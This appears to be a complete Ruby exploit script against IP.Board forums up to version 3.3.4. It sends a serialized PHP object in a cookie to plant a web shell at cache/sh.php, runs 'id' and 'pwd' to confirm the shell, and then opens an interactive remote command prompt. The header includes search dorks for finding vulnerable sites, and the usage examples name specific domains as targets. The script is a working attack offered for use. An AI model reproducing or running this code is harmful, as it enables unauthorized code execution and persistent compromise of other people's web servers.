#!/usr/bin/env ruby
#
# IPB <= 3.3.4 Unserialized RCE
# By: Hood3dRob1n
#
# PIC: http://i.imgur.com/iOF5e.png
# PIC: http://i.imgur.com/1QNX6.png
# PIC: http://i.imgur.com/TlMLw.png
#
# DORK: intext:"Community Forum Software by IP.Board 3.3.4"
# DORK: inurl:/forum/ intext:"Community Forum Software by IP.Board 3.3.3"
#

require 'optparse'
require 'net/http'
require 'base64'
require 'rubygems'
require 'colorize'

trap("SIGINT") { puts "\n\nWARNING! CTRL+C Detected, exiting program now....".red ; exit 666 }

def cls
	if RUBY_PLATFORM =~ /win32/ 
		system('cls')
	else
		system('clear')
	end
end

@banner = "IPB <= 3.3.4"
@banner += "\nRemote Code Execution Exploit"
@banner += "\nBy: Hood3dRob1n"

options = {}
optparse = OptionParser.new do |opts| 
	opts.banner = "Usage:".light_red + "#{$0} ".white + "[".light_red + "OPTIONS".white + "]".light_red
	opts.separator ""
	opts.separator "EX:".light_red + " #{$0} -t radiogodsforum.com -f /forum/".white
	opts.separator "EX:".light_red + " #{$0} --target jazzyjefffreshprince.com -f /forum/".white
	opts.separator "EX:".light_red + " #{$0} --target headlinegaming.com --forum-path /forum/".white
	opts.separator ""
	opts.separator "Options: ".light_red

	opts.on('-t', '--target <SITE>', "\n\tTarget Running IPB Forum <= 3.3.4".white) do |target|
		options[:site] = target.sub('http://', '').sub('https://','').sub(/\/$/, '')
	end

	opts.on('-f', '--forum-path <PATH>', "\n\tPath to IPB Forum".white) do |fpath|
		options[:path] = fpath
	end

	opts.on('-h', '--help', "\n\tHelp Menu".white) do 
		cls 
		puts
		puts "#{@banner}".light_red
		puts
		puts opts
		puts
		exit 69
	end
end

begin
	foo = ARGV[0] || ARGV[0] = "-h"
	optparse.parse!

	mandatory = [:site, :path]
	missing = mandatory.select{ |param| options[param].nil? }
	if not missing.empty?
		puts "Missing options: ".red + " #{missing.join(', ')}".white  
		puts optparse
		exit
	end

rescue OptionParser::InvalidOption, OptionParser::MissingArgument
	cls
	puts $!.to_s.red
	puts
	puts optparse
	puts
	exit 666;
end

cls 
puts
puts "#{@banner}".light_red
puts

#Check and confirm site is up
@site = "http://#{options[:site]}"
@path = "#{options[:path]}index.php"
url = URI.parse("#{@site}#{@path}")
while true
	begin
		http = Net::HTTP.new(url.host, url.port)
		request = Net::HTTP::Get.new(url.path)
		response = http.request(request)
		orez = response['server']
		ocoo = response['set-cookie']
		if not ocoo.nil?
			ocoo2 = response['set-cookie'].split('; ')[0]
		end
		if not orez.nil?
			if (orez =~ /IIS/ or orez =~ /\(Windows/ or orez =~ /\(Win32/ or orez =~ /\(Win64/)
				os = "Windows: #{orez}"
			elsif (orez =~ /Apache\//)
				os = "Unix: #{orez}"
			else
				os = orez
			end
		end

		# Check server status on pages requested
		if response.code == "200" or response.code == "301"
			puts "Site appears to be up".green + ".......".white
			puts "OS: ".light_green + "#{os}".white
			puts "Cookies: ".light_green + "#{ocoo}".white if not ocoo.nil?
			puts "Set Cookie: ".light_green + "#{ocoo2}".white if not ocoo2.nil?
		else
			puts
			puts "Provided site and path don't seem to be working! Please double check and try again or check manually".light_red + ".......".white
			puts
			exit 666;
		end

		@payload = URI.encode('a:1:{i:0;O:+15:"db_driver_mysql":1:{s:3:"obj";a:2:{s:13:"use_debug_log";i:1;s:9:"debug_log";s:12:"cache/sh.php";}}}');

		@phpcode = '<?error_reporting(0);print(___);passthru(base64_decode($_SERVER[HTTP_CMD]));die;?>';

		@path1 = "#{@path}?#{@phpcode}"
		@path2 = "#{options[:path]}cache/sh.php"

		puts
		puts "Attempting to trigger exploit".light_red + ".........".white

		http = Net::HTTP.new(url.host, url.port)
		request = Net::HTTP::Get.new(@path1, {'Cookie' => "member_id=#{@payload}" }) #IF cookie had prefix in response, you might edit name
		response = http.request(request)
		tracker=0
		if response.code == "200" or response.code == "301"
			puts "Site seems to be accepting injection prep, will confirm in just a sec".light_red + ".......".white
			puts
			http = Net::HTTP.new(url.host, url.port)
			request = Net::HTTP::Get.new(@path2, {'Cookie' => "member_id=#{@payload}" })
			request.add_field("Cmd", "J2lkJw==")
			response = http.request(request)
			foo = response.body.split("\n")
			if response.code == "200"
				foo.each do |line|
					if line =~ /___(.*)\s/
						funkyfresh = $1
						puts "Successful Injection".green + "!".white
						puts "ID: ".light_green + "#{funkyfresh}".white
					end
				end
			else
				tracker += 1
			end

			http = Net::HTTP.new(url.host, url.port)
			request = Net::HTTP::Get.new(@path2, {'Cookie' => "member_id=#{@payload}" })
			request.add_field("Cmd", "J3B3ZCc=")
			response = http.request(request)
			foo = response.body.split("\n")
			if response.code == "200"
				foo.each do |line|
					if line =~ /___(.*)\s/
						funkyfresh = $1
						puts "PWD: ".light_green + "#{funkyfresh}".white
					end
				end
			else
				tracker += 1
			end

			if "#{tracker}".to_i > 1
				puts
				puts "Injection doesn't seem to be working, sorry".light_red + "......".white
				puts
				exit 69;
			end

			puts

			looper=0
			while looper.to_i < 1
				begin
					print "IPB-CMD-Shell> ".light_green
					@cmd = Base64.encode64("#{gets.chomp}")
					puts
					if "#{Base64.decode64(@cmd).upcase}" == "EXIT" or "#{Base64.decode64(@cmd).upcase}" == "QUIT"
						puts
						puts "OK, exiting IPB Shell session".light_red + "......".white
						puts
						exit 69;
					end
					http = Net::HTTP.new(url.host, url.port)
					request = Net::HTTP::Get.new(@path2, {'Cookie' => "member_id=#{@payload}" })
					request.add_field("Cmd", "#{@cmd.chomp}")
					response = http.request(request)
					foo = response.body.split("\n")
					if response.code == "200"
						if response.body =~ /___(.+)/
							foo = response.body.split('/index.php?___')
							puts "#{foo[1]}".white
						end
					end
				rescue Timeout::Error
					retry
				rescue Errno::ETIMEDOUT
					retry
				end
			end
		else
			puts
			puts "Doesn't seem to be working! Please double check and try again or check manually".light_red + ".......".white
			puts
			exit 666;
		end
	rescue Timeout::Error
		redo
	rescue Errno::ETIMEDOUT
		redo
	end
	break
end
puts
#EOF
